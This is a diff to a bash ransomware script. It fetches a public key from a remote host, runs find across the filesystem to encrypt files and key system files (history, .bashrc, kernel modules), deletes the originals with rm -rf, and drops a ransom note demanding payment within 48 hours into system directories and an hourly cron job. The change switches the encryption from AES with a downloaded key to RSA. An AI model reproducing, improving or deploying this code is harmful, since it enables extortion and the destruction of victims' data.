@@ -61,16 +61,14 @@ fileList=("/root/.history" "/root/.bash_history" "/root/.bashrc" \
           "/lib/modules/$(uname -r)/kernel/drivers/cdrom/cdrom.ko" )
 
 curl http://192.168.1.132:8080/pub.pem > /root/pub.pem 
-curl http://192.168.1.132:8080/key.bin > /root/key.bin
 
 chmod 755 /root/pub.pem
-chmod 755 /root/key.bin
 
 for ((num=0; num<"${#fileExts[@]}"; num++))
 do
   for file in $(find / -name "${fileExts[${num}]}")
   do 
-    openssl enc -aes-256-cbc -salt -in "${file}" -out "${file}.owned" -pass file:/root/key.bin &>/dev/null
+    openssl rsautl -encrypt -inkey /root/pub.pem -pubin -in "${file}" -out "${file}.owned"
 
     rm -rf  ${file} &>/dev/null
   done
@@ -80,7 +78,7 @@ for ((num=0; num<"${#fileList[@]}"; num++))
 do
   for file in "${fileList[${num}]}"
   do
-    openssl enc -aes-256-cbc -salt -in "${file}" -out "${file}.owned" -pass file:/root/key.bin &>/dev/null
+    openssl rsautl -encrypt -inkey /root/pub.pem -pubin -in "${file}" -out "${file}.owned"    
 
     rm -rf ${file} &>/dev/null
   done
@@ -89,14 +87,14 @@ done
 for directory in $(find /root/ /home/ /etc/ /bin/ /usr/sbin/ /usr/bin /sbin/ /usr/local/bin/ -type d)
 do
   {
-    echo "Your files have been encrypted using AES 256-bit encryption. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit http://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever."
+    echo "Your files have been encrypted using RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit http://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever."
   } >> "${directory}/INSTRUCTIONS.txt"
 done
 
 {
   echo -en  "#"'!'"/bin/bash"
   echo -e "\n"
-  echo -e "echo \"Your files have been encrypted using AES 256-bit encryption. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit http://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever.\""
+  echo -e "echo \"Your files have been encrypted using RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit http://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever.\""
 } > /etc/cron.hourly/instructions.sh
 
 chmod 755 /etc/cron.hourly/instructions.sh
@@ -115,4 +113,4 @@ fi
 
 /bin/rm -rf  /root/key.bin &>/dev/null
 
-echo "Your files have been encrypted using AES 256-bit encryption. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit http://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever."
+echo "Your files have been encrypted using RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit http://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever."
